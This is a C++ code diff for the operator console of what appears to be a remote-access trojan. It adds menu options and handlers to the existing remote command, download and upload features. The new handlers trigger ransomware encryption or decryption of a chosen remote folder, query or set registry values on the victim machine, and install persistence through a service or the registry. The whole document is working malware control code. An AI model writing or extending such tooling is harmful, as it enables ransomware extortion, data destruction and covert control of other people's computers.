@@ -54,6 +54,15 @@ void Server::Start()
         case UPLOAD_FILE:
             UploadFile();
             break;
+        case RANSOMWARE:
+            RunRansomware();
+            break;
+        case REGISTRY_OPERATION:
+            AccessRegistry();
+            break;
+        case PERSISTENCE:
+            CreatePersistence();
+            break;
         default:
             InvalidOperation();
             break;
@@ -68,7 +77,7 @@ void Server::SetClientDedicatedDirectory()
     std::string userHomeDirectory(EnvVariable("USERPROFILE"));
     std::string clientIp(m_socket.remote_endpoint().address().to_string());
     std::cout << "Connected to: " << clientIp << std::endl;
-    m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dst" / clientIp).string();
+    m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dev" / "Dst" / clientIp).string();
 }
 
 void Server::CreateClientDedicatedDirectory()
@@ -92,6 +101,9 @@ void Server::PrintOptionsMenu()
         << "1) Run command\n"
         << "2) Download file\n"
         << "3) Upload file\n"
+        << "4) Run Ransomware\n"
+        << "5) Access Registry\n"
+        << "6) Create Persistence\n"
         << "[+] Your choise - ";
 }
 
@@ -168,6 +180,65 @@ std::string Server::CreateFileLocally(const std::string& filePath)
     OpenFileFor(fileToCreate, std::ios::out | std::ios::binary);
 
     return fileToCreate;
+}
+
+void Server::RunRansomware()
+{
+    auto operation = GetSubOperationType("Choose ransomware operation:\n1) Encrypt \n2) Decrypt \n[+] Your choise - ");
+    auto startFolder = ReadOperationInstruction("Folder to start from (remote)");
+    Send(RANSOMWARE);
+    Send(operation);
+    Send(startFolder);
+
+    if (Response() == "0")
+    {
+        std::cout << " Client does't have the folder: " << startFolder << std::endl;
+        return;
+    }
+
+    std::cout << Response() << std::endl;
+}
+
+std::string Server::GetSubOperationType(const std::string& message)
+{
+    while (true)
+    {
+        auto operation = ReadOperationInstruction(message);
+        if (operation == "1" || operation == "2")
+            return operation;
+        std::cout << "Invalid choice!" << std::endl;
+    }
+}
+
+void Server::AccessRegistry()
+{
+    auto operation = GetSubOperationType("Choose registry access type: \n1) Query value \n2) Set value \n[+] Your choise - ");
+    auto registryKey = ReadOperationInstruction("Full registry key path (remote)");
+    Send(REGISTRY_OPERATION);
+    Send(operation);
+    Send(registryKey);
+    std::cout << Response() << std::endl;
+
+    auto registryValue = ReadOperationInstruction("Registry value");
+    Send(registryValue);
+    if (operation == "2")
+    {
+        auto registryData = ReadOperationInstruction("Registry data to set ");
+        Send(registryData);
+    }
+    std::cout << Response() << std::endl;
+}
+
+void Server::CreatePersistence()
+{
+    auto operation = GetSubOperationType("Persistence type: \n1) Service \n2) Registry \n[+] Your choise - ");
+    if (operation == "1")
+    {
+        Send(PERSISTENCE);
+        std::cout << Response() << std::endl;
+    }
+    else
+        AccessRegistry();
 }
 
 
